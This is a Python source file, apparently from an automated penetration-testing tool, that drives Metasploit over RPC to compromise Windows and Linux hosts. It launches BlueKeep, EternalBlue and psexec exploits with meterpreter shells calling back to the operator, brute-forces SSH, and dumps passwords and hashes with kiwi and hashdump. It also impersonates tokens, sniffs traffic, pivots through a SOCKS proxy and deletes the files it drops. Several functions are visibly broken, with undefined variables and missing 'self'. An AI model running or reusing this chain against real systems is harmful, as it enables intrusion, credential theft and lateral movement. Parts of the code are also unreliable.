from pymetasploit3.msfrpc import MsfRpcClient
from database import mushilogger
import pprint
import time
import datetime
import re
import json
import copy
import random
import subprocess

class MetaSploit():
  def __init__(self):
    print("init metasploit..")

    self.mlogger = mushilogger.MushiLogger()


  def msf_connection(self):
    client = MsfRpcClient('test', port=55553)
    time.sleep(10)
    return client


  def check_exploit(self, i, uuid, sessions_list):

    if sessions_list:
      print("sessions_list = {}".format(sessions_list))
      self.mlogger.writelog("sessions_list = " + pprint.pformat(sessions_list), "debug")

      for key in sessions_list.keys():
        #print("key = {}".format(key))

        if uuid == sessions_list[key]["exploit_uuid"]:
          print("match key = {}".format(key))
          print("exploit_uuid = {}".format(sessions_list[key]["exploit_uuid"]))
          print("exploit success...")
          self.mlogger.writelog("exploit success...", "info")
          return 0
    else:
      print("exploit failed..")
      self.mlogger.writelog("exploit failed...", "info")
      if i == 2:
        print("three times exploit failed..")
        self.mlogger.writelog("three times exploit failed...", "info")
        return -1



  def execute_bluekeep(self, ipaddr, mushikago_ipaddr):
    client = self.msf_connection()

    cid = client.consoles.console().cid
    print('cid = {}'.format(cid))

    exploit = client.modules.use('exploit', 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce')
    exploit['RHOSTS'] = ipaddr
    exploit.target = 8
    
    payloads = ['windows/x64/meterpreter/reverse_tcp', 'windows/x64/meterpreter/bind_tcp']

    for p in payloads:
      payload = client.modules.use('payload', p)
      payload['LHOST'] = mushikago_ipaddr

      for i in range(3):
        port = random.randint(1023, 65535)
        payload['LPORT'] = str(port)
        
        print(exploit.runoptions)
        print(payload.runoptions)
        
        for j in range(3):
          exploit_id = exploit.execute(payload=payload)
          job_id = exploit_id['job_id']
          uuid = exploit_id['uuid']

          print("exploit_id = {}".format(exploit_id))
          print("job_id = {}".format(job_id))
          print("uuid = {}".format(uuid))

          print("execute exploit...")
          time.sleep(60)

          res = self.check_exploit(i, uuid, client.sessions.list)

          if res == 0:
            break
        else:
          continue
        break
      else:
        continue
      break

      if res == 0:
        break

    if res == 0:
      session_num = []
      
      print("Sessions avaiables : ")
      for s in client.sessions.list.keys():
        session_num.append(str(s))
        print(session_num)
  
      node[num]['session'] = session_num[-1]
  
      return 0
    else:
      print("exploit bluekeep failed...")
      return -1


  def execute_eternalblue(self, ipaddr, num, node, mushikago_ipaddr):
    client = self.msf_connection()

    print("execute ms17_10 eternalblue...")
    self.mlogger.writelog("execute ms17_10 eternalblue...", "info")

    #cid = client.consoles.console().cid
    #print('cid = {}'.format(cid))

    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
    exploit['RHOSTS'] = ipaddr
    
    payloads = ['windows/x64/meterpreter/reverse_tcp', 'windows/x64/meterpreter/bind_tcp']

    for p in payloads:
      payload = client.modules.use('payload', p)
      if p == 'windows/x64/meterpreter/reverse_tcp':
        payload['LHOST'] = mushikago_ipaddr

      for i in range(3):
        port = random.randint(1023, 65535)
        payload['LPORT'] = str(port)
        
        print("target = {}".format(ipaddr))
        print("port = {}".format(port))
        print("payload = {}".format(p))
        self.mlogger.writelog("target =  " + ipaddr, "info")
        self.mlogger.writelog("port =  " + str(port), "info")
        self.mlogger.writelog("payload =  " + p, "info")
        #print("exploit option = {}".format(exploit.runoptions))
        #print("payload option = {}".format(payload.runoptions))
        
        for j in range(3):
          exploit_id = exploit.execute(payload=payload)
          job_id = exploit_id['job_id']
          uuid = exploit_id['uuid']

          print("exploit_id = {}".format(exploit_id))
          print("job_id = {}".format(job_id))
          print("uuid = {}".format(uuid))

          print("execute exploit...")
          self.mlogger.writelog("execute exploit...", "info")
          time.sleep(60)

          res = self.check_exploit(j, uuid, client.sessions.list)

          if res == 0:
            break
        else:
          continue
        break
      else:
        continue
      break

    if res == 0:
      session_num = []
      
      print("Sessions avaiables : ")
      for s in client.sessions.list.keys():
        session_num.append(str(s))
        print(session_num)
  
      node[num]['session'] = session_num[-1]

      return 0
    else:
      print("exploit eternalblue failed...")
      self.mlogger.writelog("exploit eternalblue failed...", "info")
      return -1
    
  
  def execute_ms17_10_psexec(self, ipaddr, num, node, mushikago_ipaddr, account, password):
    client = self.msf_connection()

    print("execute ms17_10 psexec...")
    print("account = {}".format(account))
    print("password = {}".format(password))
    self.mlogger.writelog("execute ms17_10 psexec...", "info")
    self.mlogger.writelog("account = " + account, "info")
    self.mlogger.writelog("password = " + password, "info")

    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
    exploit['RHOSTS'] = ipaddr
    exploit['SMBUser'] = account
    exploit['SMBPass'] = password
    
    payloads = ['windows/x64/meterpreter/bind_tcp', 'windows/x64/meterpreter/reverse_tcp']

    for p in payloads:
      payload = client.modules.use('payload', p)
      if p == 'windows/x64/meterpreter/reverse_tcp':
        payload['LHOST'] = mushikago_ipaddr

      for i in range(3):
      #for i in range(1): # test
        port = random.randint(1023, 65535)
        payload['LPORT'] = str(port)
        
        print("target = {}".format(ipaddr))
        print("port = {}".format(port))
        print("payload = {}".format(p))
        self.mlogger.writelog("target =  " + ipaddr, "info")
        self.mlogger.writelog("port =  " + str(port), "info")
        self.mlogger.writelog("payload =  " + p, "info")
        #print("exploit option = {}".format(exploit.runoptions))
        #print("payload option = {}".format(payload.runoptions))
        
        for j in range(3):
        #for j in range(1): # test
          exploit_id = exploit.execute(payload=payload)
          job_id = exploit_id['job_id']
          uuid = exploit_id['uuid']

          print("exploit_id = {}".format(exploit_id))
          print("job_id = {}".format(job_id))
          print("uuid = {}".format(uuid))

          print("execute exploit...")
          self.mlogger.writelog("execute exploit...", "info")
          time.sleep(60)

          res = self.check_exploit(i, uuid, client.sessions.list)

          if res == 0:
            break
        else:
          continue
        break
      else:
        continue
      break

    if res == 0:
      session_num = []
      
      print("Sessions avaiables : ")
      for s in client.sessions.list.keys():
        session_num.append(str(s))
        print(session_num)
  
      node[num]['session'] = session_num[-1]
  
      return 0
    else:
      print("exploit eternalblue psexec failed...")
      self.mlogger.writelog("exploit eternalblue psexec failed...", "info")
      return -1


  def execute_psexec(self, ipaddr, num, node, mushikago_ipaddr, account, password, domain):
    client = self.msf_connection()

    print("execute psexec...")
    print("account = {}".format(account))
    print("password = {}".format(password))
    print("domain = {}".format(domain))
    self.mlogger.writelog("execute psexec...", "info")
    self.mlogger.writelog("account = " + account, "info")
    self.mlogger.writelog("password = " + password, "info")
    self.mlogger.writelog("domain = " + domain, "info")

    exploit = client.modules.use('exploit', 'windows/smb/psexec')
    exploit['RHOSTS'] = ipaddr
    exploit['SMBUser'] = account
    exploit['SMBPass'] = password
    exploit['SMBDomain'] = domain
    
    payloads = ['windows/x64/meterpreter/bind_tcp', 'windows/x64/meterpreter/reverse_tcp']

    for p in payloads:
      payload = client.modules.use('payload', p)
      if p == 'windows/x64/meterpreter/reverse_tcp':
        payload['LHOST'] = mushikago_ipaddr

      for i in range(3):
        port = random.randint(1023, 65535)
        payload['LPORT'] = str(port)
        
        print("target = {}".format(ipaddr))
        print("port = {}".format(port))
        print("payload = {}".format(p))
        self.mlogger.writelog("target =  " + ipaddr, "info")
        self.mlogger.writelog("port =  " + str(port), "info")
        self.mlogger.writelog("payload =  " + p, "info")
        #print("exploit option = {}".format(exploit.runoptions))
        #print("payload option = {}".format(payload.runoptions))
        
        for j in range(3):
          exploit_id = exploit.execute(payload=payload)
          job_id = exploit_id['job_id']
          uuid = exploit_id['uuid']

          print("exploit_id = {}".format(exploit_id))
          print("job_id = {}".format(job_id))
          print("uuid = {}".format(uuid))

          print("execute exploit...")
          self.mlogger.writelog("execute exploit...", "info")
          time.sleep(60)

          res = self.check_exploit(i, uuid, client.sessions.list)

          if res == 0:
            break
        else:
          continue
        break
      else:
        continue
      break

    if res == 0:
      session_num = []
      
      print("Sessions avaiables : ")
      for s in client.sessions.list.keys():
        session_num.append(str(s))
        print(session_num)
  
      node[num]['session'] = session_num[-1]
  
      return 0
    else:
      print("exploit psexec failed...")
      self.mlogger.writelog("exploit psexec failed...", "info")
      return -1


  def execute_ssh_bruteforce(self, ipaddr, num, node):
  #def execute_ssh_bruteforce(self, ipaddr):
    client = self.msf_connection()

    print("execute ssh bruteforce...")
    self.mlogger.writelog("execute ssh bruteforce...", "info")

    cid = client.consoles.console().cid
    print('cid = {}'.format(cid))

    run = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
    run['RHOSTS'] = ipaddr
    run['USERPASS_FILE'] = "./root_userpass.txt"
    run['STOP_ON_SUCCESS'] = True
    print(run.runoptions)

    run_id = run.execute()
    job_id = run_id['job_id']
    uuid = run_id['uuid']
    print("run_id = {}".format(run_id))
    print("job_id = {}".format(job_id))
    print("uuid = {}".format(uuid))

    time.sleep(60)
    res = client.consoles.console(cid).read()
    #print("res = {}".format(res))

    print("session_list = {}".format(client.sessions.list))

    session_num = ""

    #pattern = 'SSH (.*:)(.*()'
    pattern = 'SSH (.*)(:)(.*)(\(.*)'

    if client.sessions.list:
      for key in client.sessions.list.keys():
        if ipaddr == client.sessions.list[key]["target_host"] and "SSH" in client.sessions.list[key]["info"]:
          account_info = re.match(pattern, client.sessions.list[key]["info"])
          account = account_info.group(1).replace('\n', '').replace(' ', '')
          password = account_info.group(3).replace('\n', '').replace(' ', '')
          session_num = str(key)
          print("session = {}".format(key))
          print("account = {}".format(account))
          print("password = {}".format(password))
          self.mlogger.writelog("session = " + key, "info")
          self.mlogger.writelog("account = " + account, "info")
          self.mlogger.writelog("password = " + password, "info")
          break

    if session_num == "":
      return -1

    node[num]["local_account_pass"].append(account)
    node[num]["local_account_pass"].append(password)

    if session_num != "":
      print("execute sshexec...")
      self.mlogger.writelog("execute sshexec...", "info")

      exploit = client.modules.use('exploit', 'multi/ssh/sshexec')
      exploit['RHOSTS'] = ipaddr
      exploit['USERNAME'] = account
      exploit['PASSWORD'] = password

      #payload = client.modules.use('payload', 'linux/x86/meterpreter/bind_nonx_tcp')
      payload = client.modules.use('payload', 'linux/x86/meterpreter/bind_tcp')
      for i in range(5):
        port = random.randint(1023, 65535)
        payload['LPORT'] = str(port)
        
        print("target = {}".format(ipaddr))
        print("port = {}".format(port))
        print("payload = {}".format(payload))
        self.mlogger.writelog("target =  " + ipaddr, "info")
        self.mlogger.writelog("port =  " + str(port), "info")
        self.mlogger.writelog("payload = linux/x86/meterpreter/bind_tcp", "info")
        #print("exploit option = {}".format(exploit.runoptions))
        #print("payload option = {}".format(payload.runoptions))
        
        for j in range(6):
          exploit_id = exploit.execute(payload=payload)
          job_id = exploit_id['job_id']
          uuid = exploit_id['uuid']

          print("exploit_id = {}".format(exploit_id))
          print("job_id = {}".format(job_id))
          print("uuid = {}".format(uuid))

          print("execute exploit...")
          self.mlogger.writelog("execute exploit...", "info")
          time.sleep(60)

          res = self.check_exploit(j, uuid, client.sessions.list)

          if res == 0:
            break
        else:
          continue
        break

    if res == 0:
      session_num = []
      
      print("Sessions avaiables : ")
      for s in client.sessions.list.keys():
        session_num.append(str(s))
        print(session_num)
  
      node[num]['session'] = session_num[-1]
      return 0

    else:
      print("exploit ssh bruteforce failed...")
      self.mlogger.writelog("exploit ssh bruteforce failed...", "info")
      return -1

    #if session_num != "":
    #  client.consoles.console(cid).write('sessions -u ' + session_num)
    #  time.sleep(40)
    #  res = print(client.consoles.console(cid).read())
    #  if client.sessions.list:
    #    for key in client.sessions.list.keys():
    #      if ipaddr in client.sessions.list[key]["session_host"] and "meterpreter" in client.sessions.list[key]["type"]:
    #        print("session = {}".format(key))
    #        session_num = str(key)

    #  print("meterpreter session_num = {}".format(session_num))

    #  node[num]['session'] = session_num
    #  return 0
    #else:
    #  print("ssh bruteforce failed...")
    #  return -1



  def execute_incognito(self):
    client = self.msf_connection()

    print("execute incognito..")
    self.mlogger.writelog("execute incognito...", "info")

    session_num = []
    
    print("Sessions avaiables : ")
    for s in client.sessions.list.keys():
      session_num.append(str(s))
      print(session_num)

    client.sessions.session(session_num[0]).write('load incognito')
    time.sleep(10)
    print(client.sessions.session(session_num[0]).read())
    #self.mlogger.writelog("execute incognito...", "info")

    client.sessions.session(session_num[0]).write('list_tokens -u')
    time.sleep(20)
    print(client.sessions.session(session_num[0]).read())

    client.sessions.session(session_num[0]).write('impersonate_token mushikago-PC\\\\mushikago')
    time.sleep(20)
    print(client.sessions.session(session_num[0]).read())

    client.sessions.session(session_num[0]).write('rev2self')
    time.sleep(10)
    print(client.sessions.session(session_num[0]).read())


  def execute_sniff_win(self, num, node):
    client = self.msf_connection()

    print("execute network sniffing..")
    self.mlogger.writelog("execute network sniffing...", "info")

    session_num = node[num]['session']

    client.sessions.session(session_num).write('load sniffer')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
    
    client.sessions.session(session_num).write('sniffer_interfaces')
    time.sleep(10)
    result = client.sessions.session(session_num).read()
    self.mlogger.writelog(result, "info")

    interface_list = []
    interface_list.clear()
    pattern = '(.*)( - ).*'

    rows = result.splitlines()
    
    for row in rows:
      if "type:" in row.lower():
        result = re.match(pattern, row)
        interface_list.append(result.group(1).replace('\n', ''))
    
    #print("interface_list = {}".format(interface_list))

    for interface in interface_list:
      client.sessions.session(session_num).write('sniffer_start ' + interface)
      time.sleep(10)
      result = client.sessions.session(session_num).read()

      if "Capture started" in result:
        print(result)

        filename = "if" + interface + "_" + node[num]["id"] + "_" + str(datetime.date.today()) + ".pcap"

        time.sleep(50)

        client.sessions.session(session_num).write('sniffer_dump ' + interface + ' ./' + filename)
        time.sleep(30)
        #print(client.sessions.session(session_num).read())
        self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('sniffer_stop ' + interface)
        time.sleep(10)
        #print(client.sessions.session(session_num).read())
        self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('sniffer_release ' + interface)
        time.sleep(10)
        #print(client.sessions.session(session_num).read())
        self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

        node[num]["pcap_list"].append(filename)

      else:
        print("Failed capture network interface {}...".format(interface))
        self.mlogger.writelog("Failed capture network interface " + interface, "error")


  def execute_sniff_linux(self, num, node):
    client = self.msf_connection()

    print("execute network sniffing for Linux..")
    self.mlogger.writelog("execute network sniffing for Linux...", "info")

    session_num = node[num]['session']

    client.sessions.session(session_num).write('ipconfig')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    nic_info = []
    pattern = '.*( : )(.*)'
    
    rows = result.splitlines()

    for row in rows:
      if "name" in row.lower():
        result = re.match(pattern, row)
        if (result.group(2) != "lo"):
          nic_info.append(result.group(2).replace('\n', ''))
    
    print("nic info (Linux) = {}".format(nic_info))
    self.mlogger.writelog("nic info (Linux) = " + pprint.pformat(nic_info), "info")
    #node[num]['ipconfig_info'] = copy.deepcopy(ipaddr_info)

    for nic in nic_info:
      with open('./bat/tcpdump.sh', 'w') as f:
        filename = nic + "_" + node[num]["id"] + "_" + str(datetime.date.today()) + ".pcap"
        print("tcpdump -i " + nic + " -w " + filename + " -W1 -G10")

        client.sessions.session(session_num).write('execute -f tcpdump -a \"-i ' + nic + ' -w ' + filename + ' -W1 -G10\"')
        time.sleep(20)
        #print(client.sessions.session(session_num).read())
        self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('download ' + filename)
        time.sleep(20)
        #print(client.sessions.session(session_num).read())
        self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

        node[num]["pcap_list"].append(filename)

    nic_info.clear()



  def execute_kiwi(self):
    client = self.msf_connection()

    print("execute kiwi..")
    self.mlogger.writelog("execute kiwi...", "info")

    session_num = []
    
    print("Sessions avaiables : ")
    for s in client.sessions.list.keys():
      session_num.append(str(s))
      print(session_num)

    client.sessions.session(session_num).write('load kiwi')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
    
    client.sessions.session(session_num).write('lsa_dump_sam')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('lsa_dump_secrets')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
    
    client.sessions.session(session_num).write('creds_all')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")



  def execute_arpscan(self, nwaddr, cidr, node, node_num):
    client = self.msf_connection()

    print("execute arpscan {}{}...".format(nwaddr, cidr))
    self.mlogger.writelog("execute arpscan " + str(nwaddr) + cidr, "info")

    with open('./bat/arp-scan.bat', 'w') as f:
      f.write(".\\arp-scan.exe -t " + nwaddr + cidr + " > arp-scan.log")
      #f.write(".\\arp-scan.exe -t " + "10.3.200.0" + "/24" + " > arp-scan.log") # test

    session_num = node[node_num]['session']

    client.sessions.session(session_num).write('upload ./bin/arp-scan.exe')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    client.sessions.session(session_num).write('upload ./bat/arp-scan.bat')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('execute -f arp-scan.bat')
    time.sleep(1200) # 20 minutes
    #time.sleep(120) # test
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('download arp-scan.log')
    time.sleep(30)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('rm arp-scan.exe arp-scan.bat arp-scan.log')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")


  def setting_route(self, network_addr, netmask, session_num):
    client = self.msf_connection()

    print("setting routing...")
    self.mlogger.writelog("setting routing...", "info")

    cid = client.consoles.console().cid
    print('cid = {}'.format(cid))

    route = 'route add' + " " + network_addr + " " + netmask + " " + session_num
    print(route)

    client.consoles.console(cid).write(route)
    time.sleep(10)
    #print(client.consoles.console(cid).read())
    self.mlogger.writelog(client.consoles.console(cid).read(), "info")

    client.consoles.console(cid).write('route print')
    time.sleep(10)
    #print(client.consoles.console(cid).read())
    self.mlogger.writelog(client.consoles.console(cid).read(), "info")


  def execute_socks(self):
    client = self.msf_connection()

    print("execute a socks proxy...")
    self.mlogger.writelog("execute a socks proxy...", "info")

    run = client.modules.use('auxiliary', 'server/socks_proxy')
    run['VERSION'] = "4a"
    print(run.runoptions)

    job_id = run.execute()
    print(job_id)


  def hash_scrape(self, hashdump):
    #print(hashdump)

    pass_list = []
    hash_list = []
    pass_list.clear()
    hash_list.clear()

    pettern_user_pass = '\[\+\]\s{2}(.*?):"(.*)"'
    pettern_user_hash = '\[\+\]\s{2}(.*?):(.*?):(.*?):::'
  
    #print(res)
    #print(len(res))
  
    res = re.findall(pettern_user_pass, hashdump)

    for i in range(len(res)):
      #print(res[i][0])
      #print(res[i][1])
      pass_list.append(res[i][0])
      pass_list.append(res[i][1].replace('\u0000', ''))

    res = re.findall(pettern_user_hash, hashdump)

    for i in range(len(res)):
      #print(res[i][0])
      #print(res[i][1])
      hash_list.append(res[i][0])
      hash_list.append(res[i][2])

    return pass_list, hash_list

  def get_hash(self, ipaddr, num, node):
    client = self.msf_connection()

    #session_num = []
    #
    #print("Sessions avaiables : ")
    #for s in client.sessions.list.keys():
    #  session_num.append(str(s))
    #  print(session_num)

    session_num = node[num]['session']

    pass_list = []
    hash_list = []

    client.sessions.session(session_num).write('run post/windows/gather/smart_hashdump')
    time.sleep(10)
    hashdump = client.sessions.session(session_num).read()
    print(hashdump)
    self.mlogger.writelog(hashdump, "info")

    pass_list, hash_list = self.hash_scrape(hashdump)
    print("pass_list = {}".format(pass_list))
    print("hash_list = {}".format(hash_list))
    self.mlogger.writelog("pass_list = " + pprint.pformat(pass_list), "info")
    self.mlogger.writelog("hash_list = " + pprint.pformat(hash_list), "info")

    node[num]['local_account_pass'] = pass_list
    node[num]['local_account_hash'] = hash_list

    #print("smbuser = {}, smbpass = {}".format(smbuser, smbpass))
    #node[num]['local_account_hash'].append(smbuser)
    #node[num]['local_account_hash'].append(smbpass)
    #return smbuser, smbpass


  def check_vm():
    client = self.msf_connection()

    session_num = []
    
    print("Sessions avaiables : ")
    for s in client.sessions.list.keys():
      session_num.append(str(s))
      print(session_num)

    client.sessions.session(session_num[0]).write('run post/windows/gather/checkvm')
    time.sleep(10)
    print(client.sessions.session(session_num[0]).read())

    
  def check_dc():
    client.sessions.session(session_num[0]).write('run post/windows/gather/enum_domain')
    time.sleep(10)
    print(client.sessions.session(session_num[0]).read())


  def execute_zerologon():
    client = self.msf_connection()

    exploit = client.modules.use('auxiliary', 'admin/dcerpc/cve_2020_1472_zerologon')
    exploit['NMNAME'] = "WIN-XXXX"
    exploit['RHOSTS'] = ipaddr
    exploit['SMBPass'] = smbpass

    exploit.check()


  def execute_ipconfig(self, num, node):
    client = self.msf_connection()

    session_num = node[num]['session']

    print("execute ipconfig...")
    self.mlogger.writelog("execute ipconfig...", "info")
    
    client.sessions.session(session_num).write('ipconfig')
    time.sleep(10)
    result = client.sessions.session(session_num).read()
    #print(result)
    self.mlogger.writelog(result, "info")

    ipaddr_info = []
    pattern = '.*( : )(.*)'
    
    rows = result.splitlines()
    
    for row in rows:
      if "ipv4 address" in row.lower():
        result = re.match(pattern, row)
        if (result.group(2) == "127.0.0.1"):
          loopback = 1
        else:
          ipaddr_info.append(result.group(2).replace('\n', ''))
      if "ipv4 netmask" in row.lower():
        result = re.match(pattern, row)
        if (loopback == 1):
          loopback = 0
        else:
          ipaddr_info.append(result.group(2).replace('\n', ''))
    
    print("ipconfig info = {}".format(ipaddr_info))
    self.mlogger.writelog("ipconfig info = " + pprint.pformat(ipaddr_info), "info")
    node[num]['ipconfig_info'] = copy.deepcopy(ipaddr_info)

    ipaddr_info.clear()


  def execute_netstat(self, num, node):
    client = self.msf_connection()

    session_num = node[num]['session']

    print("execute netstat...")
    self.mlogger.writelog("execute netstat...", "info")
    
    client.sessions.session(session_num).write('netstat')
    time.sleep(10)
    result = client.sessions.session(session_num).read()
    #print(result)
    self.mlogger.writelog(result, "info")

    netstat_info = []
    pattern = '(.*):(.*)'

    rows = result.splitlines()
    
    for row in rows:
      if "established" in row.lower():
        c = row.split()
        result = re.match(pattern, c[2])
        try:
          netstat_info.append(result.group(1).replace('\n', ''))
          netstat_info.append(result.group(2).replace('\n', ''))
        except:
          pass
    
    print("established network info = {}".format(netstat_info))
    self.mlogger.writelog("established network info = " + pprint.pformat(netstat_info), "info")
    node[num]['netstat_info'] = copy.deepcopy(netstat_info)

    netstat_info.clear()


  def execute_ps(self, num, node):
    client = self.msf_connection()
    session_num = node[num]['session']

    print("execute ps...")
    self.mlogger.writelog("execute ps...", "info")

    client.sessions.session(session_num).write('ps')
    time.sleep(10)
    result = client.sessions.session(session_num).read()
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(result, "info")

    rows = result.splitlines()
    ps_list = []

    for row in rows:
      c = row.split()
      if len(c) >= 7 and ".exe" in c[2]:
        ps_list.append(c[2])
        #print("process = {}".format(c[2]))

    print("ps_list = {}".format(ps_list))
    self.mlogger.writelog("process list = " + pprint.pformat(ps_list), "info")

    node[num]['process_list'] = copy.deepcopy(ps_list)

    json_open = open('./arsenal/security_tool.json', 'r')
    json_load = json.load(json_open)

    st_list = []
    
    for key, values in json_load.items():
      #print(key)
      for value in values:
        for ps in ps_list:
          if (value.lower() + ".exe" == ps.lower()):
            st_list.append(key)
            break

    print("st_list = {}".format(st_list))
    self.mlogger.writelog("security tool list = " + pprint.pformat(st_list), "info")

    node[num]['security_tool'] = copy.deepcopy(st_list)

    ps_list.clear()
    st_list.clear()



  def execute_netuser(self, num, node):
    client = self.msf_connection()

    print("execute get local_user info...")
    self.mlogger.writelog("execute get local_user info...", "info")

    session_num = node[num]['session']

    client.sessions.session(session_num).write('upload ./bat/net-user.bat')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('execute -f net-user.bat')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('download net-user.log')
    time.sleep(30)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('rm net-user.bat net-user.log')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    local_account= []
    flag = 0

    with open('net-user.log', 'r') as f:
      for row in f:
        if 'command' in row.lower() and "completed" in row.lower():
          break
        elif 'コマンド' in row.lower() and "終了" in row.lower():
          break
        if flag == 1:
          #print(row)
          c = row.split()
          local_account += c
        if '-------' in row:
          flag = 1
    
    print("local account list = {}".format(local_account))
    self.mlogger.writelog("local account list = " + pprint.pformat(local_account), "info")
    node[num]['local_account_list'] = copy.deepcopy(local_account)

    local_account.clear()


  def execute_netuserdomain(self, num, node):
    client = self.msf_connection()

    print("execute get domain_user info...")
    self.mlogger.writelog("execute get domain_user info...", "info")

    session_num = node[num]['session']

    client.sessions.session(session_num).write('upload ./bat/net-user-domain.bat')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('execute -f net-user-domain.bat')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('download net-user-domain.log')
    time.sleep(30)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    client.sessions.session(session_num).write('rm net-user-domain.bat net-user-domain.log')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    pattern = '.*(for domain )(.*)'
    domain_account= []
    flag = 0
    
    with open('net-user-domain.log', 'r') as f:
      for row in f:
        if 'command' in row.lower() and "completed" in row.lower():
          break
        elif 'コマンド' in row.lower() and "終了" in row.lower():
          break
        if 'request' in row.lower() and "processed" in row.lower():
          result = re.match(pattern, row)
          domain_info = result.group(2)[:-1] # delete dot
          print("domain_info = {}".format(domain_info))
        elif '要求' in row.lower() and "処理" in row.lower():
          result = re.match(pattern, row)
          domain_info = result.group(2)[:-1] # delete dot
          print("domain_info = {}".format(domain_info))
        if flag == 1:
          #print(row)
          c = row.split()
          domain_account += c
        if '-------' in row:
          flag = 1
    
    print("domain account list = {}".format(domain_account))
    self.mlogger.writelog("domain account list = " + pprint.pformat(domain_account), "info")
    node[num]['domain_account_list'] = copy.deepcopy(domain_account)
    node[num]['domain_info'] = domain_info

    domain_account.clear()


  def execute_netuse(self, num, node):
    client = self.msf_connection()

    session_num = node[num]['session']

    print("execute netuse...")
    self.mlogger.writelog("execute netuse...", "info")

    client.sessions.session(session_num).write('upload ./bat/net-use.bat')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('execute -f net-use.bat')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('download net-use.log')
    time.sleep(30)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    client.sessions.session(session_num).write('rm net-use.bat net-use.log')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")

    nw_drive = []
    flag = 0

    with open('net-use.log', 'r') as f:
      for row in f:
        if 'command' in row.lower() and "completed" in row.lower():
          break
        elif 'コマンド' in row.lower() and "終了" in row.lower():
          break
        if flag == 1:
          #print(row)
          c = row.split()
          nw_drive.append(c[2])
        if '-------' in row:
          flag = 1

    print("network drive list = {}".format(nw_drive))
    self.mlogger.writelog("network drive list = " + pprint.pformat(nw_drive), "info")
    node[num]['network_drive'] = copy.deepcopy(nw_drive)

    nw_drive.clear()


  def execute_creds_tspkg(self, num, node):
    client = self.msf_connection()

    session_num = node[num]['session']

    print("execute creds_tspkg...")
    self.mlogger.writelog("execute creds_tspkg...", "info")

    client.sessions.session(session_num).write('load kiwi')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
    
    client.sessions.session(session_num).write('creds_tspkg')
    time.sleep(10)
    result = client.sessions.session(session_num).read()
    #print(result)
    self.mlogger.writelog(result, "info")

    rows = result.splitlines()
    domain_list = []
    flag = 0
    
    for row in rows:
      if flag == 1:
        #print(row)
        domain_list += row.split()
      if '-------' in row:
        flag = 1
    flag = 0
    
    print("domain password = {}".format(domain_list))
    self.mlogger.writelog("domain password = " + pprint.pformat(domain_list), "info")
    node[num]['domain_account_pass'] = copy.deepcopy(domain_list)
    
    domain_list.clear()


  def execute_getospatch(self, num, node):
    client = self.msf_connection()

    session_num = node[num]['session']

    print("execute get ospatch...")
    self.mlogger.writelog("execute get ospatch...", "info")
    
    client.sessions.session(session_num).write('upload ./bat/systeminfo.bat')
    time.sleep(10)
    #print(client.sessions.session(session_num).read())
    self.mlogger.writelog(client.sessions.session(session_num).read(), "info")
  
    client.sessions.session(session_num).write('execute -f systeminfo.bat')
    time.sleep(20)
    #print(client.sessions.session(session_num).read())
